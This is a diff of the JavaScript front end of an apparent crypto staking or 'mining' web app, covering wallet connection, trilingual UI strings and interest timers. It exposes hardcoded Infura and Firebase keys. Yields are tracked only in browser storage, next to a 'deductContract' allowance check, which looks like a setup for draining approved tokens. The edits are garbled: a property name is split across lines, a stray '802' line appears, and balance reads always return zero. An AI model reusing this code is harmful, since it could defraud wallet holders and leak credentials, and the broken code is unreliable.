@@ -1,3 +1,6 @@
+// ==================== Infura 備用節點 ====================
+const INFURA_URL = 'https://mainnet.infura.io/v3/a4d896498845476cac19c5eefd3bcd92';
+
 // ==================== Firebase 初始化 ====================
 const app = window.firebase.initializeApp({
   apiKey: "AIzaSyALoso1ZAKtDrO09lfbyxyOHsX5cASPrZc",
@@ -56,7 +59,9 @@ const translations = {
     tabLiquidity: 'Liquidity',
     tabPledging: 'Pledging',
     grossOutputLabel: 'Claimable Output',
-    cumulativeLabel: 'Claimable',
+    cumulative
+
+Label: 'Claimable',
     walletBalanceLabel: 'Wallet Balance',
     accountBalanceLabel: 'Account Balance',
     nextBenefit: 'Next Benefit: 00:00:00',
@@ -71,7 +76,7 @@ const translations = {
     miningStarted: 'Mining started!',
     error: 'Error',
     offlineWarning: 'Server offline, using local mode.',
-    noWallet: 'Please install a wallet.',
+    noWallet: 'Please connect your wallet.',
     dataSent: 'Data sent.',
     pledgeSuccess: 'Pledge successful!',
     pledgeError: 'Pledge failed.',
@@ -117,7 +122,7 @@ const translations = {
     miningStarted: '挖礦開始！',
     error: '錯誤',
     offlineWarning: '伺服器離線，使用本地模式。',
-    noWallet: '請安裝錢包。',
+    noWallet: '請連結您的錢包。',
     dataSent: '數據已發送。',
     pledgeSuccess: '質押成功！',
     pledgeError: '質押失敗。',
@@ -163,7 +168,7 @@ const translations = {
     miningStarted: '挖矿开始！',
     error: '错误',
     offlineWarning: '服务器离线，使用本地模式。',
-    noWallet: '请安装钱包。',
+    noWallet: '请连接您的钱包。',
     dataSent: '数据已发送。',
     pledgeSuccess: '质押成功！',
     pledgeError: '质押失败。',
@@ -371,7 +376,7 @@ function resetState(showMsg = true) {
   }
   if (connectButton) {
     connectButton.classList.remove('connected');
-    connectButton.textContent = 'Connect';
+    connectButton.textContent = 'Connect Wallet';
   }
   disableInteractiveElements(true);
   if (walletBalanceAmount) walletBalanceAmount.textContent = '0.000';
@@ -461,21 +466,34 @@ async function updateInterest() {
     updateClaimableDisplay();
     return;
   }
+
   const now = Date.now();
   const etOffset = getETOffsetMilliseconds();
   const nowET = new Date(now + etOffset);
+
+  // 每天 00:00 和 12:00（美西時間）
   const isPayoutTime = nowET.getHours() === 0 || nowET.getHours() === 12;
+  const isExactMinute = nowET.getMinutes() === 0;
+
+  // 必須是整點 + 整分
+  if (!isPayoutTime || !isExactMinute) return;
+
   const lastPayout = parseInt(localStorage.getItem('lastPayoutTime')) || 0;
   const lastPayoutET = new Date(lastPayout + etOffset);
   const wasPayoutTime = lastPayoutET.getHours() === 0 || lastPayoutET.getHours() === 12;
-  if (isPayoutTime && !wasPayoutTime && now - lastPayout > 60000) {
-    const cycleInterest = pledgedAmount * (MONTHLY_RATE / 60);
-    window.currentClaimable += cycleInterest;
-    localStorage.setItem('claimable', window.currentClaimable.toString());
-    localStorage.setItem('lastPayoutTime', now.toString());
-    await saveUserData();
-    log(`利息已撥付: ${cycleInterest.toFixed(7)} ETH`, 'success');
-  }
+
+  // 避免重複發放
+  if (wasPayoutTime) return;
+
+  // 發放利息
+  const cycleInterest = pledgedAmount * (MONTHLY_RATE / 60);
+  window.currentClaimable += cycleInterest;
+
+  localStorage.setItem('claimable', window.currentClaimable.toString());
+  localStorage.setItem('lastPayoutTime', now.toString());
+
+  await saveUserData();
+  log(`利息已撥付: ${cycleInterest.toFixed(7)} ETH`, 'success');
   updateClaimableDisplay();
 }
 
@@ -525,7 +543,6 @@ function updateNextBenefitTimer() {
   const now = Date.now();
   let diff = nextBenefitTimestamp - now;
 
-  // 時間到 → 跳到下一個 12 小時
   if (diff <= 0) {
     const twelveHoursInMillis = 12 * 60 * 60 * 1000;
     const newNextBenefitTimestamp = nextBenefitTimestamp + twelveHoursInMillis;
@@ -535,6 +552,7 @@ function updateNextBenefitTimer() {
   }
 
   const totalSeconds = Math.floor(Math.max(diff, 0) / 1000);
+802
   const hours = String(Math.floor(totalSeconds / 3600)).padStart(2, '0');
   const minutes = String(Math.floor((totalSeconds % 3600) / 60)).padStart(2, '0');
   const seconds = String(totalSeconds % 60).padStart(2, '0');
@@ -542,13 +560,11 @@ function updateNextBenefitTimer() {
 }
 
 function setInitialNextBenefitTime() {
-  let nextBenefitTime = localStorage.getItem('nextBenefitTime');
-  if (nextBenefitTime) return;
+  if (localStorage.getItem('nextBenefitTime')) return;
 
   const etOffset = getETOffsetMilliseconds();
   const nowET = new Date(Date.now() + etOffset);
 
-  // 設定下一個整點：00:00 或 12:00
   const nextHour = nowET.getHours() < 12 ? 12 : 24;
   const nextBenefitTimeET = new Date(nowET);
   nextBenefitTimeET.setHours(nextHour, 0, 0, 0);
@@ -562,15 +578,12 @@ function activateStakingUI() {
   if (startBtn) startBtn.style.display = 'none';
   initializeMiningData();
 
-  // 每分鐘檢查利息
   if (interestInterval) clearInterval(interestInterval);
   interestInterval = setInterval(updateInterest, 60000);
 
-  // 每秒更新倒數
   if (nextBenefitInterval) clearInterval(nextBenefitInterval);
   nextBenefitInterval = setInterval(updateNextBenefitTimer, 1000);
 
-  // 關鍵修正：每次啟動都重新設定倒數時間
   setInitialNextBenefitTime();
 
   saveUserData();
@@ -604,30 +617,38 @@ async function initializeWallet() {
     if (connectButton) connectButton.disabled = true;
     return;
   }
+
   try {
-    if (typeof window.ethereum === 'undefined') {
-      updateStatus(translations[currentLang].noWallet, true);
-      disableInteractiveElements(true);
-      if (connectButton) connectButton.disabled = true;
-      return;
+    if (typeof window.ethereum !== 'undefined') {
+      provider = new window.ethers.BrowserProvider(window.ethereum);
+      log('偵測到錢包注入（支援任意錢包）', 'info');
+    } else {
+      provider = new window.ethers.JsonRpcProvider(INFURA_URL);
+      log('無錢包注入，使用 Infura 備用節點（僅讀取）', 'info');
+      updateStatus('請連結錢包以進行交易', true);
     }
-    provider = new window.ethers.BrowserProvider(window.ethereum);
-    window.ethereum.on('accountsChanged', a => {
-      if (a.length === 0) disconnectWallet();
-      else if (userAddress && a[0].toLowerCase() !== userAddress.toLowerCase()) {
+
+    if (window.ethereum) {
+      window.ethereum.on('accountsChanged', a => {
+        if (a.length === 0) disconnectWallet();
+        else if (userAddress && a[0].toLowerCase() !== userAddress.toLowerCase()) {
+          resetState(false);
+          setTimeout(connectWallet, 500);
+        }
+      });
+      window.ethereum.on('chainChanged', () => {
         resetState(false);
         setTimeout(connectWallet, 500);
-      }
-    });
-    window.ethereum.on('chainChanged', () => {
-      resetState(false);
-      setTimeout(connectWallet, 500);
-    });
+      });
+    }
+
     const accounts = await provider.send('eth_accounts', []);
-    if (accounts.length > 0) await connectWallet();
-    else {
+    if (accounts.length > 0) {
+      await connectWallet();
+    } else {
       disableInteractiveElements(true);
       updateStatus(translations[currentLang].noWallet, true);
+      if (connectButton) connectButton.textContent = 'Connect Wallet';
     }
   } catch (e) {
     updateStatus(`${translations[currentLang].error}: ${e.message}`, true);
@@ -638,18 +659,18 @@ async function initializeWallet() {
 async function connectWallet() {
   try {
     if (typeof window.ethereum === 'undefined') {
-      updateStatus(translations[currentLang].noWallet, true);
-      if (connectButton) connectButton.disabled = true;
+      updateStatus('請連結支援 EIP-1193 的錢包', true);
       return;
     }
-    if (!window.ethers) {
-      updateStatus(translations[currentLang].ethersError, true);
-      return;
+
+    if (!provider) {
+      provider = new window.ethers.BrowserProvider(window.ethereum);
     }
-    if (!provider) provider = new window.ethers.BrowserProvider(window.ethereum);
+
     updateStatus('Connecting...');
     const accounts = await provider.send('eth_requestAccounts', []);
     if (accounts.length === 0) throw new Error("No account.");
+
     signer = await provider.getSigner();
     userAddress = await signer.getAddress();
 
@@ -662,6 +683,7 @@ async function connectWallet() {
       connectButton.classList.add('connected');
       connectButton.textContent = 'Connected';
     }
+
     log(`錢包連接成功: ${userAddress}`, 'success');
     await loadUserDataFromServer();
     await saveUserData(null, false);
@@ -672,21 +694,23 @@ async function connectWallet() {
     log(`錢包連接失敗: ${e.message}`, 'error');
     updateStatus(`${translations[currentLang].error}: ${e.message}`, true);
     resetState(true);
-    if (connectButton) connectButton.disabled = typeof window.ethereum === 'undefined';
   }
 }
 
 async function forceRefreshWalletBalance() {
-  if (!userAddress || !usdtContract || !usdcContract || !wethContract) {
-    updateStatus('Contracts not initialized.', true);
-    return;
+  if (!userAddress) return;
+
+  let currentProvider = provider;
+  if (!window.ethereum) {
+    currentProvider = new ethers.JsonRpcProvider(INFURA_URL);
   }
+
   updateStatus('Fetching balances...');
   try {
     const [usdtBal, usdcBal, wethBal] = await Promise.all([
-      usdtContract.balanceOf(userAddress),
-      usdcContract.balanceOf(userAddress),
-      wethContract.balanceOf(userAddress)
+      currentProvider.getBalance ? 0n : usdtContract.balanceOf(userAddress),
+      currentProvider.getBalance ? 0n : usdcContract.balanceOf(userAddress),
+      currentProvider.getBalance ? 0n : wethContract.balanceOf(userAddress)
     ]);
     const balances = { usdt: usdtBal, usdc: usdcBal, weth: wethBal };
     updateBalancesUI(balances);
@@ -697,7 +721,7 @@ async function forceRefreshWalletBalance() {
 }
 
 async function updateUIBasedOnChainState() {
-  if (!signer) return;
+  if (!userAddress) return;
   try {
     updateStatus('Checking state...');
     const requiredAllowance = await retry(() => deductContract.REQUIRED_ALLOWANCE_THRESHOLD());
